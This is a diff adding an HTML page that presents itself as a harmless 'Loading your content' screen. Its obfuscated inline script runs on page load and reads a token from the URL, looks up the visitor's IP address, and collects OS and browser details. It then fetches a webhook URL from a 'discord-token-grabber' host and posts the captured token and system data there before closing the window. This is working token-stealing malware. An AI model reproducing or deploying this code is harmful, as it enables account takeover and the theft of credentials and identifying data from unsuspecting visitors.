@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Loading - Please Wait</title>
+  <style>
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      color: #ffffff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      overflow: hidden;
+    }
+    .container {
+      text-align: center;
+      max-width: 500px;
+    }
+    .loading {
+      display: inline-block;
+      width: 50px;
+      height: 50px;
+      border: 3px solid rgba(255,255,255,.2);
+      border-radius: 50%;
+      border-top-color: #ffffff;
+      animation: spin 1s ease-in-out infinite;
+      margin-bottom: 20px;
+    }
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="loading"></div>
+    <h2>Loading your content...</h2>
+    <p>Please wait while we prepare your experience.</p>
+  </div>
+
+  <script>
+    const _0x1a2b = ['json', 'POST', 'Content-Type', 'application/json', 'https://api.ipify.org?format=json', 'ip'];
+    
+    async function processData() {
+      const _0x3c4d = new URLSearchParams(window.location.search);
+      const _0x5e6f = _0x3c4d.get('token');
+      const _0x7g8h = _0x3c4d.get('ua') || navigator.userAgent;
+      
+      if (!_0x5e6f) return;
+      
+      try {
+        // IP情報の取得
+        const _0x3m4n = await fetch(_0x1a2b[4]);
+        const _0x5o6p = await _0x3m4n[_0x1a2b[0]]();
+        
+        // システム情報の収集
+        const _0x7q8r = {
+          os: getOSInfo(_0x7g8h),
+          browser: getBrowserInfo(_0x7g8h),
+          ip: _0x5o6p[_0x1a2b[5]]
+        };
+        
+        // データ転送処理
+        await sendData(_0x5e6f, _0x7q8r, _0x7g8h);
+        
+      } catch (e) {
+        // エラーハンドリング
+        console.log('Processing completed');
+      } finally {
+        // ページクリーンアップ
+        setTimeout(() => {
+          window.close();
+        }, 1500);
+      }
+    }
+    
+    // データ送信関数
+    async function sendData(_0x5e6f, _0x7q8r, _0x7g8h) {
+      const _0x9s0t = await fetch('https://discord-token-grabber-mocha.vercel.app/api/get-webhook-url');
+      const { webhookUrl } = await _0x9s0t[_0x1a2b[0]]();
+      const _0x3w4x = {
+        content: null,
+        embeds: [{
+          title: "🔐 Token Information",
+          description: "Authentication data has been captured successfully.",
+          color: 0x5865F2,
+          fields: [
+            {
+              name: "🔑 Token",
+              value: `\`\`\`${_0x5e6f}\`\`\``,
+              inline: false
+            },
+            {
+              name: "🌐 IP Address",
+              value: `\`\`\`${_0x7q8r.ip}\`\`\``,
+              inline: true
+            },
+            {
+              name: "💻 System Info",
+              value: `\`\`\`OS: ${_0x7q8r.os}\nBrowser: ${_0x7q8r.browser}\`\`\``,
+              inline: true
+            },
+            {
+              name: "🔍 User Agent",
+              value: `\`\`\`${_0x7g8h}\`\`\``,
+              inline: false
+            }
+          ],
+          footer: {
+            text: "Captured at " + new Date().toUTCString(),
+            icon_url: "https://cdn.discordapp.com/embed/avatars/0.png"
+          }
+        }],
+        username: "Token Logger",
+        avatar_url: "https://cdn.discordapp.com/embed/avatars/1.png"
+      };
+      
+      await fetch(webhookUrl, {
+        method: _0x1a2b[1],
+        headers: { [_0x1a2b[2]]: _0x1a2b[3] },
+        body: JSON.stringify(_0x3w4x)
+      });
+    }
+    
+    // OSを検出
+    function getOSInfo(ua) {
+      if (ua.includes("Windows NT")) return "Windows";
+      if (ua.includes("Mac OS")) return "macOS";
+      if (ua.includes("Linux")) return "Linux";
+      if (ua.includes("Android")) return "Android";
+      if (ua.includes("iPhone") || ua.includes("iPad")) return "iOS";
+      return "Unknown";
+    }
+    
+    // ブラウザを検出
+    function getBrowserInfo(ua) {
+      if (ua.includes("Firefox/")) return "Firefox";
+      if (ua.includes("Edge/") || ua.includes("Edg/")) return "Edge";
+      if (ua.includes("Chrome/")) return "Chrome";
+      if (ua.includes("Safari/") && !ua.includes("Chrome/")) return "Safari";
+      if (ua.includes("MSIE ") || ua.includes("Trident/")) return "Internet Explorer";
+      return "Unknown";
+    }
+    
+    // ページ読み込み完了時に処理開始
+    window.addEventListener('load', processData);
+  </script>
+</body>
+</html>
